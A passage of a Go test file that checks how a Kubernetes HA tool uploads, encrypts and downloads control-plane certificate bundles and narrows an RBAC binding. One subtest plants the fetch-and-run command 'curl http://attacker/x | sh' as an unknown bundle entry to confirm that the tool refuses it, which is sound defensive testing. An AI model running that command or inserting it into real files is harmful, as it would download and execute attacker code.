package ha

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"maps"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/validation/field"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/fake"
	k8stesting "k8s.io/client-go/testing"

	"github.com/ctrliq/stratum/internal/k8sutil"
	"github.com/ctrliq/stratum/internal/maintlease"
	"github.com/ctrliq/stratum/internal/netcfg"
	"github.com/ctrliq/stratum/internal/netcfg/netdefault"
	"github.com/ctrliq/stratum/internal/nodestate"
	"github.com/ctrliq/stratum/internal/pki"
	"github.com/ctrliq/stratum/internal/version"
)

func uploadFixture(t *testing.T) *fake.Clientset {
	t.Helper()
	origPKI := version.PKIDir
	version.PKIDir = t.TempDir()
	t.Cleanup(func() { version.PKIDir = origPKI })
	if err := pki.GenerateAll("cp1", "192.0.2.10", nil); err != nil {
		t.Fatalf("GenerateAll: %v", err)
	}
	origNet := version.NetConfigPath
	version.NetConfigPath = filepath.Join(t.TempDir(), "netconfig")
	t.Cleanup(func() { version.NetConfigPath = origNet })
	if err := netcfg.Save(netdefault.PodCIDR, netdefault.ServiceCIDR, "fuzz.internal"); err != nil {
		t.Fatalf("netcfg.Save: %v", err)
	}

	oldAwait := awaitJoinFenceEnforcement
	awaitJoinFenceEnforcement = func(context.Context, kubernetes.Interface) error { return nil }
	t.Cleanup(func() { awaitJoinFenceEnforcement = oldAwait })
	oldReq, oldEnsure, oldList, oldClient := requireControlPlanePKI, ensureEtcdTrust, uploadListMembers, uploadClientset
	t.Cleanup(func() {
		requireControlPlanePKI, ensureEtcdTrust, uploadListMembers, uploadClientset = oldReq, oldEnsure, oldList, oldClient
	})
	requireControlPlanePKI = func(bool) error { return nil }
	ensureEtcdTrust = func() error { return nil }
	uploadListMembers = func() ([]string, error) { return []string{"10.0.0.11"}, nil }
	cs := fake.NewSimpleClientset()
	mintedTokensExist(cs)
	uploadClientset = func() (kubernetes.Interface, error) { return cs, nil }
	return cs
}

// Reactors run under the fake's lock; reach the store through the tracker only.
func mintedTokensExist(cs *fake.Clientset) {
	gvr := corev1.SchemeGroupVersion.WithResource("secrets")
	cs.PrependReactor("*", "secrets", func(action k8stesting.Action) (bool, runtime.Object, error) {
		var written *corev1.Secret
		switch a := action.(type) {
		case k8stesting.CreateAction:
			written, _ = a.GetObject().(*corev1.Secret)
		case k8stesting.UpdateAction:
			written, _ = a.GetObject().(*corev1.Secret)
		}
		if written == nil || written.Name != certsSecret {
			return false, nil, nil
		}
		known := map[types.UID]bool{}
		if stored, err := cs.Tracker().Get(gvr, "kube-system", certsSecret); err == nil {
			for _, r := range stored.(*corev1.Secret).OwnerReferences {
				known[r.UID] = true
			}
		}
		for _, r := range written.OwnerReferences {
			if known[r.UID] || !strings.HasPrefix(r.Name, "bootstrap-token-") {
				continue
			}
			tok := &corev1.Secret{ObjectMeta: metav1.ObjectMeta{Name: r.Name, Namespace: "kube-system", UID: r.UID}}
			if err := cs.Tracker().Create(gvr, tok, "kube-system"); err != nil && !apierrors.IsAlreadyExists(err) {
				return true, nil, err
			}
		}
		return false, nil, nil
	})
}

func tokenOwner(name, uid string) *metav1.OwnerReference {
	return &metav1.OwnerReference{APIVersion: "v1", Kind: "Secret", Name: name, UID: types.UID(uid)}
}

func grantEntryName(tokenID string) string { return "certs-" + tokenID }

func grantTokenID(owner *metav1.OwnerReference) string {
	return strings.TrimPrefix(owner.Name, "bootstrap-token-")
}

func uploadedCertsSecret(t *testing.T, cs *fake.Clientset) *corev1.Secret {
	t.Helper()
	sec, err := cs.CoreV1().Secrets("kube-system").Get(context.Background(), certsSecret, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("get %s: %v", certsSecret, err)
	}
	return sec
}

func grantDecrypts(t *testing.T, sec *corev1.Secret, entry, key string, uploaded map[string][]byte) {
	t.Helper()
	files := decryptedEnvelope(t, sec, entry, key).Files
	if len(files) != len(uploaded) {
		t.Errorf("the %q entry carries %d files, the upload set has %d", entry, len(files), len(uploaded))
	}
	for name, want := range uploaded {
		if !bytes.Equal(files[name], want) {
			t.Errorf("the %q entry's %s does not match the uploaded file", entry, name)
		}
	}
}

func TestTwoUploadsLeaveTheBundleUnderTheNewestKey(t *testing.T) {
	cs := uploadFixture(t)
	owner1, owner2 := tokenOwner("bootstrap-token-abc123", "uid-token-1"), tokenOwner("bootstrap-token-def456", "uid-token-2")
	k1, k2 := mustKey(t), mustKey(t)
	if k1 == k2 {
		t.Fatal("precondition: the two certificate-keys differ")
	}
	if err := UploadCerts(k1, owner1, nil); err != nil {
		t.Fatalf("first upload: %v", err)
	}
	if err := UploadCerts(k2, owner2, nil); err != nil {
		t.Fatalf("second upload: %v", err)
	}

	ctx := context.Background()
	list, err := cs.CoreV1().Secrets("kube-system").List(ctx, metav1.ListOptions{})
	if err != nil {
		t.Fatal(err)
	}
	n := 0
	for _, s := range list.Items {
		if s.Name == certsSecret {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("found %d %s Secrets, want exactly one after two uploads", n, certsSecret)
	}
	sec := uploadedCertsSecret(t, cs)
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}

	grantDecrypts(t, sec, grantEntryName(grantTokenID(owner1)), k1, uploaded)
	grantDecrypts(t, sec, grantEntryName(grantTokenID(owner2)), k2, uploaded)

	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k2), uploaded)

	owners := map[string]bool{}
	for _, r := range sec.OwnerReferences {
		owners[string(r.UID)] = true
	}
	if !owners[string(owner1.UID)] || !owners[string(owner2.UID)] {
		t.Errorf("owner references %v do not carry both token owners %q and %q — the second upload dropped a pending join's grant",
			sec.OwnerReferences, owner1.UID, owner2.UID)
	}
}

func TestSecondControlPlaneTokenKeepsOrRevokesTheFirst(t *testing.T) {
	cs := uploadFixture(t)
	owner1, owner2 := tokenOwner("bootstrap-token-abc123", "uid-token-1"), tokenOwner("bootstrap-token-def456", "uid-token-2")
	k1, k2 := mustKey(t), mustKey(t)
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}

	if err := UploadCerts(k1, owner1, nil); err != nil {
		t.Fatalf("first mint: %v", err)
	}
	sec := uploadedCertsSecret(t, cs)
	grantDecrypts(t, sec, grantEntryName(grantTokenID(owner1)), k1, uploaded)
	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k1), uploaded)

	if err := UploadCerts(k2, owner2, nil); err != nil {
		t.Fatalf("second mint: %v", err)
	}
	sec = uploadedCertsSecret(t, cs)
	grantDecrypts(t, sec, grantEntryName(grantTokenID(owner1)), k1, uploaded)
	grantDecrypts(t, sec, grantEntryName(grantTokenID(owner2)), k2, uploaded)
	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k2), uploaded)

	owners := map[string]bool{}
	for _, r := range sec.OwnerReferences {
		owners[string(r.UID)] = true
	}
	if !owners[string(owner1.UID)] || !owners[string(owner2.UID)] {
		t.Errorf("owner references %v do not carry both token owners %q and %q",
			sec.OwnerReferences, owner1.UID, owner2.UID)
	}
}

func TestReUploadCertsRetiresGrantsSealedBeforeIt(t *testing.T) {
	cs := uploadFixture(t)
	k1, k2 := mustKey(t), mustKey(t)
	if err := UploadCerts(k1, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
		t.Fatalf("the grant's mint: %v", err)
	}
	rotated := filepath.Join(version.PKIDir, pki.RootTrustBundleName)
	b, err := os.ReadFile(rotated)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(rotated, append(b, b...), 0o644); err != nil {
		t.Fatal(err)
	}
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}
	if err := ReUploadCerts(k2); err != nil {
		t.Fatalf("the rotation re-upload: %v", err)
	}
	sec := uploadedCertsSecret(t, cs)
	if _, ok := sec.Data[grantEntryName("abc123")]; ok {
		t.Error("the re-upload kept a grant sealed before it: its joiner would install the pre-rotation trust")
	}
	if _, err := decryptGrant(sec, k1, "abc123"); err == nil {
		t.Error("the pre-rotation join command still decrypts the bundle after the rotation re-upload")
	}
	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k2), uploaded)
	if len(sec.GetOwnerReferences()) != 1 {
		t.Errorf("owner references = %v, want the grant token's kept: the re-upload retires entries, not the Secret's lifetime", sec.GetOwnerReferences())
	}
}

// Spelled out here because the JSON names are the cross-version contract.
type envelopeShape struct {
	Version  int `json:"version"`
	Metadata struct {
		Generation       uint64   `json:"generation"`
		EtcdEndpoints    []string `json:"etcdEndpoints"`
		CarriesAtRestKey bool     `json:"carriesAtRestKey"`
		VIP              string   `json:"vip,omitempty"`
		Profile          *string  `json:"profile,omitempty"`
	} `json:"metadata"`
	Files map[string][]byte `json:"files"`
}

func sealedEnvelope(t *testing.T, key string, env envelopeShape) []byte {
	t.Helper()
	b, err := json.Marshal(env)
	if err != nil {
		t.Fatal(err)
	}
	ct, err := encrypt(key, b)
	if err != nil {
		t.Fatal(err)
	}
	return ct
}

func encryptFlat(t *testing.T, key string, files map[string][]byte) []byte {
	t.Helper()
	b, err := json.Marshal(files)
	if err != nil {
		t.Fatal(err)
	}
	ct, err := encrypt(key, b)
	if err != nil {
		t.Fatal(err)
	}
	return ct
}

func decryptedEnvelope(t *testing.T, sec *corev1.Secret, entry, key string) envelopeShape {
	t.Helper()
	ct, ok := sec.Data[entry]
	if !ok {
		t.Fatalf("stratum-certs carries no %q entry", entry)
	}
	plain, err := decrypt(key, ct)
	if err != nil {
		t.Fatalf("the certificate-key does not open the %q entry: %v", entry, err)
	}
	var env envelopeShape
	if err := json.Unmarshal(plain, &env); err != nil {
		t.Fatalf("the %q entry is not the v1 envelope: %v", entry, err)
	}
	if env.Version != 1 {
		t.Fatalf("the %q entry carries envelope version %d, want 1", entry, env.Version)
	}
	return env
}

func decryptedFlatMap(t *testing.T, sec *corev1.Secret, entry, key string) map[string][]byte {
	t.Helper()
	ct, ok := sec.Data[entry]
	if !ok {
		t.Fatalf("stratum-certs carries no %q entry", entry)
	}
	plain, err := decrypt(key, ct)
	if err != nil {
		t.Fatalf("the certificate-key does not open the %q entry: %v", entry, err)
	}
	var files map[string][]byte
	if err := json.Unmarshal(plain, &files); err != nil {
		t.Fatalf("the %q entry is not the legacy flat map: %v", entry, err)
	}
	return files
}

func uploadedFilesMatch(t *testing.T, files, uploaded map[string][]byte) {
	t.Helper()
	if len(files) != len(uploaded) {
		t.Errorf("the bundle carries %d files, the upload set has %d", len(files), len(uploaded))
	}
	for name, want := range uploaded {
		if !bytes.Equal(files[name], want) {
			t.Errorf("the bundle's %s does not match the uploaded file", name)
		}
	}
}

func controlPlaneStateDir(t *testing.T) {
	t.Helper()
	orig := version.K8sConfDir
	version.K8sConfDir = t.TempDir()
	t.Cleanup(func() { version.K8sConfDir = orig })
}

func controlPlaneState(t *testing.T, vip string) {
	t.Helper()
	controlPlaneStateDir(t)
	st := &nodestate.NodeState{Role: "controller", Hostname: "cp1", VIP: nodestate.VIP{Address: vip}}
	if err := nodestate.SaveState(st); err != nil {
		t.Fatalf("SaveState: %v", err)
	}
}

func TestUploadPublishesTheVersionedEnvelope(t *testing.T) {
	cs := uploadFixture(t)
	controlPlaneState(t, "10.0.0.10")
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}

	owner := tokenOwner("bootstrap-token-abc123", "uid-token-1")
	k1 := mustKey(t)
	if err := UploadCerts(k1, owner, nil); err != nil {
		t.Fatalf("upload: %v", err)
	}
	sec := uploadedCertsSecret(t, cs)

	env := decryptedEnvelope(t, sec, grantEntryName("abc123"), k1)
	if env.Metadata.Generation != 1 {
		t.Errorf("the first publication's generation = %d, want 1", env.Metadata.Generation)
	}
	if env.Metadata.VIP != "10.0.0.10" {
		t.Errorf("envelope metadata VIP = %q, want the control plane's recorded 10.0.0.10", env.Metadata.VIP)
	}
	if want := []string{"10.0.0.11"}; !slices.Equal(env.Metadata.EtcdEndpoints, want) {
		t.Errorf("envelope metadata etcd endpoints = %q, want %q — the addresses a joiner dials move into the authenticated metadata",
			env.Metadata.EtcdEndpoints, want)
	}
	if env.Metadata.CarriesAtRestKey {
		t.Error("envelope metadata says the bundle carries the at-rest key, but the fixture uploaded none")
	}
	uploadedFilesMatch(t, env.Files, uploaded)
	for name := range env.Files {
		if _, ok := certAllowlist[name]; !ok {
			t.Errorf("the envelope's files carry %q, which is outside the strict allowlist: unknown names are never ignored", name)
		}
	}

	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k1), uploaded)
	if got := parseEtcdEndpoints(sec.Annotations[etcdEndpointsAnnotation]); !slices.Equal(got, []string{"10.0.0.11"}) {
		t.Errorf("the etcd endpoints annotation = %v, want the same list the envelope authenticates", got)
	}

	k2 := mustKey(t)
	if err := UploadCerts(k2, tokenOwner("bootstrap-token-def456", "uid-token-2"), nil); err != nil {
		t.Fatalf("second upload: %v", err)
	}
	sec = uploadedCertsSecret(t, cs)
	if env := decryptedEnvelope(t, sec, grantEntryName("def456"), k2); env.Metadata.Generation != 2 {
		t.Errorf("the second publication's generation = %d, want 2", env.Metadata.Generation)
	}
	if env := decryptedEnvelope(t, sec, grantEntryName("abc123"), k1); env.Metadata.Generation != 1 {
		t.Errorf("the second mint moved the first grant's generation to %d, want 1: mint appends, never replaces", env.Metadata.Generation)
	}
	uploadedFilesMatch(t, decryptedFlatMap(t, sec, "certs", k2), uploaded)
}

func TestUploadPublishesTheVersionedEnvelopeWithoutAVIP(t *testing.T) {
	t.Run("a control plane with no recorded VIP publishes none", func(t *testing.T) {
		cs := uploadFixture(t)
		controlPlaneState(t, "")
		k := mustKey(t)
		if err := UploadCerts(k, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
			t.Fatalf("upload: %v", err)
		}
		env := decryptedEnvelope(t, uploadedCertsSecret(t, cs), grantEntryName("abc123"), k)
		if env.Metadata.VIP != "" {
			t.Errorf("envelope metadata VIP = %q, want none recorded", env.Metadata.VIP)
		}
	})
	t.Run("a control plane with no saved node state still uploads", func(t *testing.T) {
		cs := uploadFixture(t)
		controlPlaneStateDir(t) // an empty state directory
		k := mustKey(t)
		if err := UploadCerts(k, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
			t.Fatalf("upload: %v", err)
		}
		env := decryptedEnvelope(t, uploadedCertsSecret(t, cs), grantEntryName("abc123"), k)
		if env.Metadata.VIP != "" {
			t.Errorf("envelope metadata VIP = %q, want none without saved state", env.Metadata.VIP)
		}
	})
}

func TestUploadPublishesTheAtRestKeyProof(t *testing.T) {
	cs := uploadFixture(t)
	keyB64 := testEncryptionKey(t)
	configPath := filepath.Join(version.PKIDir, encryptionConfigEntry)
	if err := os.WriteFile(configPath, []byte(testEncryptionConfig(keyB64)), 0o600); err != nil {
		t.Fatal(err)
	}
	config, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	k1 := mustKey(t)
	if err := UploadCerts(k1, tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
		t.Fatalf("upload: %v", err)
	}
	sec := uploadedCertsSecret(t, cs)
	proof, ok := sec.Data[encryptionKeyProofEntry]
	if !ok {
		t.Fatal("the keyed upload published no encryption-key-proof entry: the controller-start key gate answers unkeyed for a bundle that carries this node's key")
	}
	raw, err := atRestKeyFromEncryptionConfig(config)
	if err != nil {
		t.Fatal(err)
	}
	if !atRestKeyProofOpens(proof, raw) {
		t.Error("the published proof does not open under the at-rest key the bundle carries")
	}
	otherB64 := testEncryptionKey(t)
	otherRaw, err := base64.StdEncoding.DecodeString(otherB64)
	if err != nil {
		t.Fatal(err)
	}
	if atRestKeyProofOpens(proof, otherRaw) {
		t.Error("the published proof opens under another key")
	}
	if env := decryptedEnvelope(t, sec, grantEntryName("abc123"), k1); !env.Metadata.CarriesAtRestKey {
		t.Error("the envelope metadata does not say the bundle carries the at-rest key")
	}

	if err := os.Remove(configPath); err != nil {
		t.Fatal(err)
	}
	k2 := mustKey(t)
	if err := UploadCerts(k2, tokenOwner("bootstrap-token-def456", "uid-token-2"), nil); err != nil {
		t.Fatalf("keyless re-upload: %v", err)
	}
	sec = uploadedCertsSecret(t, cs)
	if stale, ok := sec.Data[encryptionKeyProofEntry]; ok {
		t.Errorf("the keyless re-upload left a %d-byte proof entry behind: it vouches for a key this bundle does not carry", len(stale))
	}
	if env := decryptedEnvelope(t, sec, grantEntryName("def456"), k2); env.Metadata.CarriesAtRestKey {
		t.Error("the keyless upload's envelope metadata says the bundle carries the at-rest key")
	}
}

func serveCertsSecret(t *testing.T, sec *corev1.Secret) *httptest.Server {
	t.Helper()
	b, err := json.Marshal(sec)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/api/v1/namespaces/kube-system/secrets/stratum-certs" {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write(b)
			return
		}
		http.NotFound(w, r)
	}))
	t.Cleanup(srv.Close)
	return srv
}

func writeBootstrapKubeconfig(t *testing.T, server, token string) string {
	t.Helper()
	const tpl = `apiVersion: v1
kind: Config
clusters:
- name: c
  cluster:
    server: %s
contexts:
- name: ctx
  context:
    cluster: c
    user: u
current-context: ctx
users:
- name: u
  user:
    token: %s
`
	path := filepath.Join(t.TempDir(), "bootstrap.kubeconfig")
	if err := os.WriteFile(path, []byte(fmt.Sprintf(tpl, server, token)), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestDownloadCertsDecryptsTheGrantsOwnEntry(t *testing.T) {
	uploadFixture(t) // a real PKI the decrypted bundle is written into
	uploaded, err := collectBundle(false)
	if err != nil {
		t.Fatalf("collectBundle: %v", err)
	}
	uploaded[netconfigEntry] = []byte("the downloaded grant's own bundle")
	uploaded[encryptionConfigEntry] = []byte("the downloaded grant's at-rest key")
	k1, k2 := mustKey(t), mustKey(t)
	markerOnDisk := func(t *testing.T) {
		t.Helper()
		got, err := os.ReadFile(filepath.Join(version.PKIDir, netconfigEntry))
		if err != nil || !bytes.Equal(got, uploaded[netconfigEntry]) {
			t.Errorf("PKIDir/%s = %q (%v), want the bytes of the bundle that was decrypted", netconfigEntry, got, err)
		}
	}

	t.Run("the grant's own entry", func(t *testing.T) {
		env := envelopeShape{Version: 1}
		env.Metadata.Generation = 1
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		env.Metadata.CarriesAtRestKey = true
		env.Metadata.VIP = "10.0.0.10"
		env.Files = uploaded
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system",
				Annotations: map[string]string{etcdEndpointsAnnotation: "192.0.2.99"}},
			Data: map[string][]byte{
				"certs":                  encryptFlat(t, k2, uploaded), // the newest mint's, flat map
				grantEntryName("abc123"): sealedEnvelope(t, k1, env),
				grantEntryName("def456"): sealedEnvelope(t, k2, env),
			},
		}
		srv := serveCertsSecret(t, sec)
		kc := writeBootstrapKubeconfig(t, srv.URL, "abc123.0123456789abcdef")
		grant, err := DownloadCerts(kc, k1, nil)
		if err != nil {
			t.Fatalf("DownloadCerts with this grant's own certificate-key: %v", err)
		}
		if !slices.Equal(grant.Published, []string{"10.0.0.11"}) {
			t.Errorf("grant etcd endpoints = %v, want the envelope's authenticated [10.0.0.11], not the annotation's 192.0.2.99", grant.Published)
		}
		if grant.VIP != "10.0.0.10" {
			t.Errorf("grant VIP = %q, want the authenticated metadata's 10.0.0.10", grant.VIP)
		}
		if grant.Generation != 1 {
			t.Errorf("grant generation = %d, want the envelope's 1", grant.Generation)
		}
		if !grant.CarriedKey {
			t.Error("grant says the bundle carried no at-rest key, but its metadata and files carry one")
		}
		markerOnDisk(t)
	})

	t.Run("legacy fallback", func(t *testing.T) {
		keyless := map[string][]byte{}
		for name, b := range uploaded {
			if name != encryptionConfigEntry {
				keyless[name] = b
			}
		}
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system",
				Annotations: map[string]string{etcdEndpointsAnnotation: "10.0.0.11"}},
			Data: map[string][]byte{"certs": encryptFlat(t, k2, keyless)},
		}
		srv := serveCertsSecret(t, sec)
		kc := writeBootstrapKubeconfig(t, srv.URL, "def456.0123456789abcdef")
		grant, err := DownloadCerts(kc, k2, nil)
		if err != nil {
			t.Fatalf("DownloadCerts from a legacy single-entry bundle: %v", err)
		}
		if !slices.Equal(grant.Published, []string{"10.0.0.11"}) {
			t.Errorf("grant etcd endpoints = %v, want the legacy annotation's [10.0.0.11]", grant.Published)
		}
		if grant.VIP != "" || grant.Generation != 0 {
			t.Errorf("grant metadata = VIP %q generation %d, want none from a legacy bundle", grant.VIP, grant.Generation)
		}
		if grant.CarriedKey {
			t.Error("grant says the legacy bundle carried the at-rest key, but it carries none")
		}
		markerOnDisk(t)
	})

	t.Run("unknown entries are refused inside the envelope too", func(t *testing.T) {
		env := envelopeShape{Version: 1}
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		env.Files = uploaded
		env.Files["authorized_keys"] = []byte("curl http://attacker/x | sh")
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system"},
			Data:       map[string][]byte{grantEntryName("abc123"): sealedEnvelope(t, k1, env)},
		}
		srv := serveCertsSecret(t, sec)
		kc := writeBootstrapKubeconfig(t, srv.URL, "abc123.0123456789abcdef")
		if _, err := DownloadCerts(kc, k1, nil); err == nil || !strings.Contains(err.Error(), "authorized_keys") {
			t.Fatalf("DownloadCerts = %v, want a refusal naming the envelope's unknown entry", err)
		}
		if _, statErr := os.Stat(filepath.Join(version.PKIDir, "authorized_keys")); statErr == nil {
			t.Error("the refused envelope wrote its unknown entry into the PKI directory")
		}
	})

	t.Run("an unknown envelope version is refused", func(t *testing.T) {
		env := envelopeShape{Version: 2}
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		env.Files = uploaded
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system"},
			Data:       map[string][]byte{grantEntryName("abc123"): sealedEnvelope(t, k1, env)},
		}
		srv := serveCertsSecret(t, sec)
		kc := writeBootstrapKubeconfig(t, srv.URL, "abc123.0123456789abcdef")
		if _, err := DownloadCerts(kc, k1, nil); err == nil {
			t.Fatal("DownloadCerts decoded an envelope version this build does not support as if it were v1")
		}
	})

	t.Run("a key that opens nothing is refused", func(t *testing.T) {
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system"},
			Data:       map[string][]byte{"certs": encryptFlat(t, k2, uploaded)},
		}
		srv := serveCertsSecret(t, sec)
		kc := writeBootstrapKubeconfig(t, srv.URL, "abc123.0123456789abcdef")
		if _, err := DownloadCerts(kc, k1, nil); err == nil {
			t.Fatal("DownloadCerts succeeded with a certificate-key that opens neither the grant's own entry nor the legacy one")
		}
	})
}

func TestReUploadCertsIsTheRotatingUpload(t *testing.T) {
	uploadFixture(t)
	var rotating []bool
	requireControlPlanePKI = func(r bool) error { rotating = append(rotating, r); return nil }
	if err := os.Remove(filepath.Join(version.PKIDir, "ca.key")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(version.PKIDir, "ca-new.key"), []byte("staged"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := ReUploadCerts(mustKey(t)); err == nil {
		t.Error("ReUploadCerts went ahead without ca.key for a rotation not recorded as forced")
	}
	markForced(t)
	if err := ReUploadCerts(mustKey(t)); err != nil {
		t.Fatalf("ReUploadCerts: %v", err)
	}
	if err := UploadCerts(mustKey(t), nil, nil); err == nil {
		t.Error("UploadCerts went ahead without ca.key")
	}
	if !slices.Equal(rotating, []bool{true, true, false}) {
		t.Errorf("requireControlPlanePKI saw rotating=%v, want [true true false]", rotating)
	}
}

func certsReaderBinding(t *testing.T, cs *fake.Clientset) *rbacv1.RoleBinding {
	t.Helper()
	rb, err := cs.RbacV1().RoleBindings("kube-system").Get(context.Background(), "stratum:certs-reader", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("get stratum:certs-reader RoleBinding: %v", err)
	}
	return rb
}

var controlPlaneGroupOnly = []rbacv1.Subject{{Kind: "Group", Name: k8sutil.ControlPlaneBootstrapGroup, APIGroup: rbacv1.GroupName}}

func TestUploadCertsGrantsOnlyTheControlPlaneGroup(t *testing.T) {
	cs := uploadFixture(t)
	if err := UploadCerts(mustKey(t), tokenOwner("bootstrap-token-abc123", "uid-token-1"), nil); err != nil {
		t.Fatalf("upload: %v", err)
	}
	if got := certsReaderBinding(t, cs).Subjects; !slices.Equal(got, controlPlaneGroupOnly) {
		t.Errorf("stratum:certs-reader subjects = %+v, want only %+v", got, controlPlaneGroupOnly)
	}
}

func TestUploadCertsReconcilesAnOldShapeBinding(t *testing.T) {
	cs := uploadFixture(t)
	createOldShapeBinding(t, cs)
	if err := ReUploadCerts(mustKey(t)); err != nil {
		t.Fatalf("upload: %v", err)
	}
	if got := certsReaderBinding(t, cs).Subjects; !slices.Equal(got, controlPlaneGroupOnly) {
		t.Errorf("stratum:certs-reader subjects = %+v after the upload, want only %+v", got, controlPlaneGroupOnly)
	}
}

func TestUploadCertsRefusesAForeignBinding(t *testing.T) {
	cs := uploadFixture(t)
	foreign := &rbacv1.RoleBinding{
		ObjectMeta: metav1.ObjectMeta{Name: "stratum:certs-reader", Namespace: "kube-system"},
		RoleRef:    rbacv1.RoleRef{APIGroup: rbacv1.GroupName, Kind: "ClusterRole", Name: "view"},
		Subjects:   []rbacv1.Subject{{Kind: "Group", Name: k8sutil.BootstrapGroup, APIGroup: rbacv1.GroupName}},
	}
	if _, err := cs.RbacV1().RoleBindings("kube-system").Create(context.Background(), foreign, metav1.CreateOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := UploadCerts(mustKey(t), nil, nil); err == nil {
		t.Fatal("upload succeeded over a stratum:certs-reader binding to another role")
	}
	if _, err := cs.CoreV1().Secrets("kube-system").Get(context.Background(), certsSecret, metav1.GetOptions{}); !apierrors.IsNotFound(err) {
		t.Errorf("get %s after the refused upload: %v, want NotFound", certsSecret, err)
	}
}

func createOldShapeBinding(t *testing.T, cs *fake.Clientset) {
	t.Helper()
	old := &rbacv1.RoleBinding{
		ObjectMeta: metav1.ObjectMeta{Name: "stratum:certs-reader", Namespace: "kube-system"},
		RoleRef:    rbacv1.RoleRef{APIGroup: rbacv1.GroupName, Kind: "Role", Name: "stratum:certs-reader"},
		Subjects:   []rbacv1.Subject{{Kind: "Group", Name: k8sutil.BootstrapGroup, APIGroup: rbacv1.GroupName}},
	}
	if _, err := cs.RbacV1().RoleBindings("kube-system").Create(context.Background(), old, metav1.CreateOptions{}); err != nil {
		t.Fatal(err)
	}
}

func conflictOnUpdate(cs *fake.Clientset, n int) *int {
	calls := 0
	cs.PrependReactor("update", "rolebindings", func(k8stesting.Action) (bool, runtime.Object, error) {
		calls++
		if calls <= n {
			return true, nil, apierrors.NewConflict(schema.GroupResource{Group: rbacv1.GroupName, Resource: "rolebindings"}, "stratum:certs-reader", nil)
		}
		return false, nil, nil
	})
	return &calls
}

func TestUploadCertsRetriesAConflictingBindingUpdate(t *testing.T) {
	cs := uploadFixture(t)
	createOldShapeBinding(t, cs)
	calls := conflictOnUpdate(cs, 1)
	if err := ReUploadCerts(mustKey(t)); err != nil {
		t.Fatalf("upload after one conflicting update: %v", err)
	}
	if *calls != 2 {
		t.Errorf("RoleBinding updates = %d, want 2 (one conflict, one retry)", *calls)
	}
	if got := certsReaderBinding(t, cs).Subjects; !slices.Equal(got, controlPlaneGroupOnly) {
		t.Errorf("stratum:certs-reader subjects = %+v, want only %+v", got, controlPlaneGroupOnly)
	}
}

func TestUploadCertsStopsWhenTheBindingNeverSettles(t *testing.T) {
	cs := uploadFixture(t)
	createOldShapeBinding(t, cs)
	conflictOnUpdate(cs, 1000)
	if err := ReUploadCerts(mustKey(t)); !apierrors.IsConflict(err) {
		t.Fatalf("upload = %v, want the Conflict surfaced", err)
	}
	if _, err := cs.CoreV1().Secrets("kube-system").Get(context.Background(), certsSecret, metav1.GetOptions{}); !apierrors.IsNotFound(err) {
		t.Errorf("get %s after the failed upload: %v, want NotFound", certsSecret, err)
	}
}

func TestNarrowCertsReaderBindingDropsTheWorkerGrant(t *testing.T) {
	cs := fake.NewSimpleClientset()
	createOldShapeBinding(t, cs)
	if err := NarrowCertsReaderBinding(context.Background(), cs); err != nil {
		t.Fatalf("narrow: %v", err)
	}
	if got := certsReaderBinding(t, cs).Subjects; !slices.Equal(got, controlPlaneGroupOnly) {
		t.Errorf("stratum:certs-reader subjects = %+v, want only %+v", got, controlPlaneGroupOnly)
	}
}

func TestNarrowCertsReaderBindingLeavesAnAbsentBindingAbsent(t *testing.T) {
	cs := fake.NewSimpleClientset()
	if err := NarrowCertsReaderBinding(context.Background(), cs); err != nil {
		t.Fatalf("narrow: %v", err)
	}
	if _, err := cs.RbacV1().RoleBindings("kube-system").Get(context.Background(), "stratum:certs-reader", metav1.GetOptions{}); !apierrors.IsNotFound(err) {
